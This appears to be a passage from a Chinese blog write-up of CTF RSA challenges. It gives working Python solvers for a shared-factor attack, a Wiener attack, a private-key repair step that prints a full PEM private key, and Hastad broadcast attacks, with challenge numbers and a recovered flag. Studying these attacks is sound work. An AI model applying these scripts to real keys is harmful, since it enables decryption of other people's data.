class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> lines = open(<span class="string">&#x27;tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()  </span><br><span class="line">c1 = int(lines[<span class="number">2</span>],<span class="number">16</span>)  </span><br><span class="line">c2 = int(lines[<span class="number">6</span>],<span class="number">16</span>)  </span><br><span class="line">n1 = int(lines[<span class="number">0</span>])  </span><br><span class="line">n2 = int(lines[<span class="number">4</span>])   </span><br><span class="line">p1 = gmpy2.gcd(n1, n2)  </span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)  </span><br><span class="line">p2 = n1 / p1  </span><br><span class="line">p3 = n2 / p1  </span><br><span class="line">e = <span class="number">0x10001</span>  </span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))  </span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))  </span><br><span class="line">m1 = pow(c1, d1, n1)  </span><br><span class="line">m2 = pow(c2, d2, n2)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m1)+long_to_bytes(m2) </span><br></pre></td></tr></table></figure><p>数据放在文本中–严格遵守c为十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711</span><br><span class="line">e is 65537</span><br><span class="line">0x15b9bfc47ff3791eee8d13760c676bf6c17b357e663cbf898d5ebb5de19d1ef2b56346ed1e471e014749d63e1d645a1150d0d29cb7a3346841e600b9488ab189d57fd8b31e268e9d0ad9ae173d9c68ab7880e6583adc770d72f33a71c9f2b4c1c039834b4cae08735925e4f04b658b302fc401df629eedc7d0f79108f2bddea08606380977a5434f20725319573d2db76a2909ebe565211cff605aa001922e0cc53b4430f08e352f9ddc6ae144c48cd3494942189330d45dbf0c2fb3356dd54d6140f1169975454fc8ccedb3b8847967165911d94b7577b68215cbee6ee244a68086d080663ebeb3c8cc7c46aaa13a73d88fe3350f9c627b56a31d5da8f5b7b6</span><br><span class="line"></span><br><span class="line">23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747</span><br><span class="line">e is 65537</span><br><span class="line">0xce4647358e97f5ec92edc325b703996160ec041c056cd0a9e7b3b00f66a431277ef35277671233137929c8325e60f6c60a6399bcecf8b454c7865a56857723364c6c172c462fc6ab03a590882d82ac57d1f5483466b3010f14091a31ca470da5872e2e944918d8142fc0896cb386ca47592d56b63fcb7addbcc6218d676ff6305e1ee79a71eacb6cf84a022e1993500c4f45c72691cc6d4db60d75f9fa95a770e840ffcfc3d058644a054ba265cbde13c41d197cb8cf8235e67046845cd4ecbbf5ec37443a74252aee386fae320a12b2284fabaa0c8af346fde3bfa1b7933fd9f1b673ea0675ec0039c192ee53ae3b06494ecb92f7e44f8b5cfdf6d2bfb42af</span><br></pre></td></tr></table></figure><h4 id="低解密指数攻击-e过大、过小"><a href="#低解密指数攻击-e过大、过小" class="headerlink" title="低解密指数攻击(e过大、过小)"></a>低解密指数攻击(e过大、过小)</h4><p>前提：</p><p>e过大或过小（一般e过大时使用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L</span></span><br><span class="line">    e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L</span></span><br><span class="line">    c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  rsa-wiener-attack-master python steady.py</span><br><span class="line">Hacked!</span><br><span class="line">flag&#123;Wien3r_4tt@ck_1s_3AsY&#125;</span><br></pre></td></tr></table></figure><h4 id="私钥文件修复"><a href="#私钥文件修复" class="headerlink" title="私钥文件修复"></a>私钥文件修复</h4><p>openssl提取公钥信息，将Modulus替换到脚本中。</p><p>私钥文件修复</p><p><code>https://github.com/Zui-Qing-Feng/RSA/blob/master/%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D</code></p><p>生成私钥内容然后跑脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKAIBAAKCAgEAwJd4U0VkhH2MxLQg6TNYZ+x4Pmz18FygPu7cJWPQ6yqeuo8Z</span><br><span class="line">UqJnC+dusjS4bVB24GrRA893M9ix6dc75escZQwllv2WILl63h2&#x2F;&#x2F;fK2v4E+PkdE</span><br><span class="line">Q5i&#x2F;ZS9nfid1+VZHusTwTmcr2uAadxRAKcGoZ1qP9S6+joIxPUMm1JeGKRUUqWk2</span><br><span class="line">LHbttZDr7G&#x2F;O1cokHKr2Y&#x2F;gGomLLJnTTW4JLttXgSTJ7YvgFxPcOhlmb8xclAqo8</span><br><span class="line">l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk4eRM+OmtJcfgwBW7tGdIkAObIH8M</span><br><span class="line">F+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJWYH6iE9ZYGuEhK3ZxyWM6MDo9yae</span><br><span class="line">N5V84UgpD1HnvZgv9syA5&#x2F;AyC4lRkk7CbVBTKzt3ctG9Gh+S1xJ5YWHFpH6zhevw</span><br><span class="line">fG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj3IyDC6Iq1TxBSEFUGqnotnC&#x2F;0&#x2F;7t</span><br><span class="line">GRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1&#x2F;ALpRlXVpNPnxjB3+XPpRFLYE51dv576</span><br><span class="line">OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQAB6sIZehln1rFflsyTR&#x2F;cNedLdFI</span><br><span class="line">SoFx+BLdMrpkMWAIJksJIgODkBd&#x2F;86dyV7+JbeTXQCSLe73fM8D&#x2F;MC7obB0CAwEA</span><br><span class="line">AQKCAgAuZ5DPh6XboqC7eKeBaSTBDaI&#x2F;cGOmAbt+znDu9WkOcNuEGhzA426u2Jm8</span><br><span class="line">iKVzeXLbSgGIyIFxVaIwtPKyyH6z&#x2F;kREaF+3DNoFEOgE2WmdJRgJS4SwQOrFB7IJ</span><br><span class="line">HJr5dAeegftg+M0BVQQrcw6uwQHBvXl4W0YA8m&#x2F;I0hhWGxhxZ6nt0&#x2F;MArbtDB2NB</span><br><span class="line">OgN9UdJ3sd3iYo2+rM1EO9v9bZyutkPvfyFpzFcfiWPPjWHdJdN+G+Szno9VVUmx</span><br><span class="line">KDZWE+moY96a6HH409juattxnLZgU3EUfMGCm&#x2F;GUdugeZNCAGs5S+ym&#x2F;zb6wONig</span><br><span class="line">QlomoldnWHVI66flir8++RALcUFWC46IH2FyrAJfWR+c8E5ns8Z+HlnZFFO+z2i&#x2F;</span><br><span class="line">xWWc9jqFMqDq0yQccqLUWFqPDVINClfIu7bUoM7QLuEKohdkyTwbcx9zOqVuNg7d</span><br><span class="line">18g+Qrm3Ru+uD0ni85mnwWA3kZPdQ6pvJaEDJzRPp0rpZyjEP4p2FtXDbp7I1gy9</span><br><span class="line">qH834mmrcH2R5RANmJZFIb0T49beAqF7B3wO0AfCpUj1D827JRKCww1OLv02FVAL</span><br><span class="line">NPjcf7aIfecFAHTOc56NOwLdB7MvPw4O5LtUaLTHMUxZ1CIzB&#x2F;Ks4P9Yn7O0du9n</span><br><span class="line">FxPmYPWCYoXJX+DFOqc3U4atY6bTs2z6QLs6cdPQrltEXeYFRQKCAQEA7iHlusjD</span><br><span class="line">SIy9vtxsYzr2qz6CqMUrd8FtaeYf2SCGXHEGfDlYCVNbS0dktyAkZ27mZxAovKzR</span><br><span class="line">hRwB04PxtNNboTPdo5iDbqC8J8Kxvz6W6TeCjZLDEyoOunrYdE8SyK&#x2F;1tX7oCrbe</span><br><span class="line">+8Xk3pE5RzypwNZbp7V9gQsjJxe6oZlkRTXEGgJDJ5mV+v29ngoNki+zMhTk6emu</span><br><span class="line">bf23cSmT+f7cw5Cs5+jgaCMrYliciLaejF869+JCcZm2Kj7eCP0lDJ9HMVa+v79n</span><br><span class="line">KPeDyvdj680KMNv3RQhVjfavMsoIriIDfKczduzBdtylgBkLsqozoqmhyL&#x2F;MuAY3</span><br><span class="line">1VwCrLXipyWIzwKCAQEAzwrQ0VVkMYZ7xIxCnv004&#x2F;DyDePSOJkU2ToMaE0Bcf+y</span><br><span class="line">pEEu&#x2F;KjW8aU6TKPNWHnAcCL0nzozoZcYNJyrI195DXiT8wXSaL2uR2gum+E71ov8</span><br><span class="line">5MdIz+z9NTqXJsvRjy5w399n&#x2F;O+g+XeIObAMGi+&#x2F;UdLYLgquPVa7Pd37sPt69Cf1</span><br><span class="line">H7TZx9y6+nXH1iCLa5LQm0pgedaQTxbR9EtY&#x2F;Fj2vIc4I5JxduGb3kFm7D3Sc6Nq</span><br><span class="line">P354hJnmO&#x2F;diiCjxLhVqHiiPuIrmAOSZ4X4VRWOkPMylKoFkx3HxqW1Zkq&#x2F;Hk&#x2F;ms</span><br><span class="line">jM8IUHBtSKd6Vh3&#x2F;&#x2F;NYUq2SCt2Dys95f6YlonhQfUwKCAQEAwypk7cC8zCkNGe&#x2F;t</span><br><span class="line">pSYeJBsHWuq9xVhyI+jHEVzmwbygZA9bZ8k5eWj50lw1edAaZT2JJZk93qollQT+</span><br><span class="line">hAT1hBjN&#x2F;dZxYam6i5u1sdfKNzmXdhBicMJ3b75eyHRGINSVvDpWUvGtrwtxmDfN</span><br><span class="line">ieTd+32zgK&#x2F;uPGS0WsXH38mntFFsdySDhWEK2ro7PdtfZABUDSeytUMgAmV+gvBg</span><br><span class="line">pvOKW32nOCpUQQUR+XhGUoXZS5KA8cguTIx+EAGWWCegxceEwZsmmmB0W87&#x2F;5Mj8</span><br><span class="line">y7UwNPsSnTFHbSJQVH&#x2F;gvVaDJRajx0QjCxerTGE6hSOZTidYwP7w+aGfAO54ArTP</span><br><span class="line">Hc5VYQKCAQBVC3RLCHBnh34&#x2F;df3HoOqg1tAWtIYdiYPu1tFR5o+5a&#x2F;bNUZkjX5cr</span><br><span class="line">G1ufL4mh1iEd7r3cyeN7dL0Un2YM2aK3zde386RCMefsnPbIQPR7ZHU05EccYZSA</span><br><span class="line">0NhVr1MdJU5oJzRnyWauElN6nr3Z49MKoTj7cJexynaPKye&#x2F;wwz2TZN6uqbaWejU</span><br><span class="line">CJ1Vb3jVbzERGLQYV&#x2F;JfClijqG+c+E4hksmUkwrYckO8P9EvKRXROkbiXejTTwQr</span><br><span class="line">jaqDk42+CD3WtYKTozpnE3&#x2F;CCDBkmFFWSBlwJEZpRnylw60Pe&#x2F;TW66&#x2F;dBw27PPMm</span><br><span class="line">7ORri1cjXCyRWm&#x2F;3M3N+PtHW9AJtLIbRAoIBABgyTrVuAjXd7qO57px&#x2F;XHtUXvgX</span><br><span class="line">udo7XstJ9DYLE4roLEj8zUYDFS9KmGjANcmBpcgbKagWN9SqDQSfo8WkEoAue74n</span><br><span class="line">7+8goDbeh0YQ2y0mDmpP34dBwF79USn3O+2lVI+1HXUTfTxOTmLPo5bSsv38HL2t</span><br><span class="line">3Ll6cUCg&#x2F;&#x2F;M7IAQbpRME3z8gIe0&#x2F;HNWkZjyRadnBsk1QbEmZ8fBtiEp2LHFjnJLA</span><br><span class="line">SiU+f38+cqqUFcrGBlNvc&#x2F;7W0SB2a5rp81XRwBGXEGtt+fYlBCWIuHVEih9qFqnP</span><br><span class="line">6VAeL6lKMzIpH1rbIrwFoIpMzyrnAjZGOJZ6bBcbgMFtNLBmJMSlmuSIao8&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP    </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/pubkey.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    key = RSA.importKey(f)  </span><br><span class="line">    N = key.n  </span><br><span class="line">    e = key.e    </span><br><span class="line">    <span class="keyword">print</span> N  </span><br><span class="line">    <span class="keyword">print</span> e    </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/1.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    private = RSA.importKey(f)  </span><br><span class="line">    oaep = PKCS1_OAEP.new(private)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Downloads/godlikeRSA/flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure><h4 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h4><p>前提：</p><p>模数n、密文c不同，明文m、加密指数e相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, iroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">broadcast</span>(<span class="params">n1, n2 ,n3, c1, c2, c3</span>):</span></span><br><span class="line">    n = [n1, n2, n3]</span><br><span class="line">    C = [c1, c2, c3]</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        N *= i</span><br><span class="line"></span><br><span class="line">    Ni = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        Ni.append(N / i)</span><br><span class="line"></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        T.append(long(invert(Ni[i], n[i])))</span><br><span class="line"></span><br><span class="line">    X = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        X += C[i] * Ni[i] * T[i]</span><br><span class="line"></span><br><span class="line">    m3 = X % N</span><br><span class="line">    m = iroot(m3, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    c1 = <span class="number">0x9e84763bdbe246fad0a9cd52fda6233e6128a6210efaf3e6dea4fe272f78ad1f8f5cc7022f62f4f542341128e42d6fd10e67c5f96edbd243917c0151289f7228e44019b8c65a541d7306b398465e26b69cab36cc61e4ac094832b4299bbaf4630b722a0fb4f1997053be97e926f94afb55a0bb6ef00ab694e2f595d9eb8ca96c49f5cbbe194529f68a1aaf6f5151484b471285ba8fc8cd30b55612f35a74dc68e255c363579a80d27ce5090873ac719ba59f2492c91fd28bcce26b6a02bae005cbbd2a4cfe5b93442be8664d2313d412e7e09f545c64b7b74bbc408b6e574d0d300135cba8d6c1d73737d59baca9992ede644d856eb4cfcda562a75743e4b491</span></span><br><span class="line">    c2 = <span class="number">0x9817fdc7b31a8f9cde1794096d3aa2bc6fe06fe34d4b7c9ca9a77982adf67fd4a7e636659553f4168a16757dc3a75e54ff850b9a94a5270f4f75502c7055a3a389df2ea6b00784a4e78e66901b427253c0f343f127e0ff162a349bb14eb4c1453fc6daace19bba4940d77c435686ef3b59f732072cde2e148d1a64f9682b3f1ceb9a000d87e180a1f9eb20c59dbebc13ddb2e07b64db89217f40369aeec878a45d99909ab2a3e4cdb74aa68890c941315ae289d6667200c53f9a32c8a64bfc74e62898ac03c460f945a13f11ee28860a3cd07526c30aa92eb89442a76549fe4ed8a43d14fdeeb350e90443a3a586db719f8610eb5d4a8f5bd1e481b5ef6e96ef</span></span><br><span class="line">    c3 = <span class="number">0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0</span></span><br><span class="line">    n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555</span></span><br><span class="line">    n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867</span></span><br><span class="line">    n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303</span></span><br><span class="line">    m = broadcast(n1, n2 ,n3, c1, c2, c3)</span><br><span class="line">    <span class="keyword">print</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">items</span>):</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N / n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [<span class="number">8564529398597496052509875513481234511905571293608253591774352345237876733293108831203723008958367224489489969614656703455962549261315442327443089652074571708651505447379309166100331065440172781968875497386410667715026180057913363208450111095566219238303387888025161407043477291378931412269049849744457547932264137377411127192940332805452317547219248055802197050456726624516860024108642571703812719370387292166670300197241575461417648592309869669813374010765766544607691011957968652581504886331252936146901456910589102484807039294566703917033093028140452849747910537865958098720693569821256189593894121111357731919189L</span>,<span class="number">12222166297277342805260668042066733749258843622057497574551492680820573970618063356710810891221670366396148862070530068431772630271300064517141331380959413811482890080103511756363920299387620181525172247384085449944650678616398890947062703879307721506228672839270493453501648644787019360131991056158375296484870723717496184332078521221915234959627683952251865227849249752415242124235776428944052873501045127442031423538183282845800971359590735184850648986263721823804859410866927117413289461014754456802566932965710529063515405296476007642849800772934170961993925017146017197762805148533435040675962332469643915192423L</span>,<span class="number">5057224034499776793532654516178914954537547410664409403680432108569079856741764362023185604595829263918927121465578691201904227912897025244771553860102714429349163283510695391193774853323951653123109509215361937850724934183826508070404239791710229214063382081391564954935544392514769166830815475459218792639383796711824752291158895292103354274632470559179266550681095452239666165213986993496109747058314685303485222302144835490056402939133225003233112131275635419321982899965440912525225759368684717157077161771778903529280898069381899400305195745292409238361901176051346615633641550303346790420492393767770845418243L</span>]</span><br><span class="line">c = [<span class="number">20010971557789931948130798983030201950038450269144104532821030667924400788869920238579729514672630221804096063149106742412869966814701225466606392171030411339119559280790040322081104363393453503417465768386174002015870794567148694722215873094298859132439253412531445187990845476275251348800166731481176155530755581153710085966976765505591809596417849783597055650440598035159288091495453205698044687869932756053447012994409598155552263807571713982758132066319612777306466708222135510918174055647735727504029507503430288609410745159037684948343055275573269067165460711584845480188706531450367147105629493736100726092945L</span>,<span 